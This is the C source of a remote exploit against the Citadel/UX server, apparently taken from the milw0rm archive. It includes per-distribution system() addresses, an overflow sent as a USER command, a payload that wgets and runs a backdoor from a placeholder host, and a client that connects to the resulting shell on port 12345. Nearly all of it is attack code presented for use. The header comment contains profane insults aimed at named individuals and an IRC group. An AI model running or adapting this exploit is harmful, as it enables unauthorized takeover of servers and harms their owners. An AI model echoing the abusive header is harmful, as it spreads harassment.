/*
Citadel/UX remote exploit
By nebunu: pppppppal at yahoo dot com

This is the version which contains targets,abuse it kiddies

Bruteforce:

You only have 4096/4=1024 tries.
The magic offset lies about 2048 + or - 4,8,16....256
So practically speaking you have maximum 256 tries.


Greetings: DrBIOS,Bagabontu,rebel,R4X and all the friends i have.

F goes to: #rosec @ undernet, www rosec info read and laugh
lacroix you are a big lamer,a little script kiddie who wants to gain fame on vortex.pulltheplug
wargame server.By the way,you pathetic cunt..have you even hacked into a box other than yours?
Mad anal fucks goes to all #rosec members,dont forget their moms.

My little private message:

Sa va bagam pule in gat celor de pe irc.apropo.ro,in special lui shell (nimeni) si toata
gasca de cacaciosi de la #rosec
Ce tupeu pe voi sa vreti donatii in e-gold..va dau eu donatii in sloboz..
*/

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>

/*
Place here your own link which contains a backdoor (blackhole.c) which listens on port 12345
*/

#define COMMAND "cd /tmp;wget http://your-site-here.com/a;/tmp/a;"
#define BUFFER 93            
#define CITADEL_PORT 504
#define RETADDR 0xbffff000 
#define BACKDOOR_PORT 12345
#define MAXTARGETS 9


struct architecture 
{
char *platform;     
int syst;          
}arch[]={
{"Red Hat 7.1 (Seawolf)",0x4006aef0},
{"Red Hat 7.2 (Enigma)",0x4006f664},
{"Red Hat 7.3 (Valhalla)",0x080482d0},
{"SuSE Linux 8.0",0x4006f004},
{"Debian sid unstable release",0x4005f270},
{"Slackware 8.0.0",0x40062870},
{"Slackware 9.0.0",0x40061530},
{"Slackware 9.1.0",0x4006be80},
{"SuSE Linux 8.0",0x4006f004},
};
        



void shell(int sock)
{
fd_set  fd_read;
char buff[1024000], *cmd="cd /;uname -a;id\n";
int n;
FD_ZERO(&fd_read);
FD_SET(sock, &fd_read);
FD_SET(0, &fd_read);
send(sock, cmd, strlen(cmd), 0);
while(1) {        
FD_SET(sock,&fd_read);
FD_SET(0,&fd_read);
if (select(FD_SETSIZE, &fd_read, NULL, NULL, NULL) < 0 ) break;
if (FD_ISSET(sock, &fd_read)) 
{
if((n = recv(sock, buff, sizeof(buff), 0)) < 0)
{
fprintf(stderr, "EOF\n");
exit(2);
}
if (write(1, buff, n) > 0);
}
if (FD_ISSET(0, &fd_read)) 
{        
if((n = read(0, buff, sizeof(buff))) < 0)
{
fprintf(stderr, "EOF\n");
exit(2);
}
if (send(sock, buff, n, 0) < 0) break;
}
usleep(10);
}
fprintf(stderr, "Connection lost.\n\n");
exit(0);
}


int fuck(char *fuck)
{
struct sockaddr_in addr2;	
int sock2	= 0;
if ((sock2 = socket(AF_INET, SOCK_STREAM, 6)) < 0) 
{
return -1;
}

addr2.sin_addr.s_addr=inet_addr(fuck);
addr2.sin_family = AF_INET;
addr2.sin_port   = htons(BACKDOOR_PORT);
if(connect(sock2, (struct sockaddr *)&addr2, sizeof(addr2)) == -1) 
{
printf("\n\nExploit failed!\n\n");
return -1;
}
shell(sock2);
close(sock2);
return 0;
}

void exploit(char ip[16],int target,int tryy)
{
int i,sock,t,len,n;
char overflow[500],system[8],ret[8];
char egg[500];
int *pt;
int retaddr;
struct sockaddr_in addy;

retaddr=RETADDR+tryy;
memset(overflow,0,500);
memset(egg,0,500);
memset(ret,0,8);
memset(system,0,8);
for(i=0;i<(BUFFER-strlen(COMMAND));i++)
overflow[i]='/';
strcat(overflow,COMMAND);
pt=(int *)system;
for(i=0;i<4;i+=4)*pt++=arch[target].syst;
strcat(overflow,system);
strcat(overflow,"AAAA");
pt=(int *)ret;
for(i=0;i<4;i+=4)*pt++=retaddr;
strcat(overflow,ret);
strcpy(egg,"USER ");
strcat(egg,overflow);
strcat(egg,"\n");

sock=socket(AF_INET,SOCK_STREAM,0);
if(sock==-1)
{
perror("socket()");
exit(-1);
}
addy.sin_family=AF_INET;
addy.sin_port=htons(CITADEL_PORT);
addy.sin_addr.s_addr=inet_addr(ip);
t=connect(sock,(struct sockaddr *)&addy,sizeof(struct sockaddr_in));
if(t==-1)
{
perror("connect()");
exit(-1);
}
write(sock,egg,strlen(egg));
printf("%s\n",egg);
close(sock);
}



int main(int argc,char **argv)
{

int i,targ;
if(argc!=4)
{
printf("\r\nCitadel/UX remote exploit (private version) by nebunu <pppppppal at yahoo dot com>\r\n
Usage: %s <target ip> <target number> <offset [1..4096]>\r\n",argv[0]);
printf("\nAvailable targets:\n");
for(i=0;i<MAXTARGETS;i++)printf("\n%u) Platform %s,system=0x%x",i,arch[i].platform,arch[i].syst);
printf("\n");
exit(-1);
}


if(strlen(COMMAND)>92)
{
printf("\r\nCommand string too large\r\n");
exit(-1);
}

targ=atoi(argv[2]);
printf("\r\nAttacking %s\n",arch[targ].platform);
exploit(argv[1],targ,atoi(argv[3]));
fuck(argv[1]);

}

// milw0rm.com [2004-09-09]
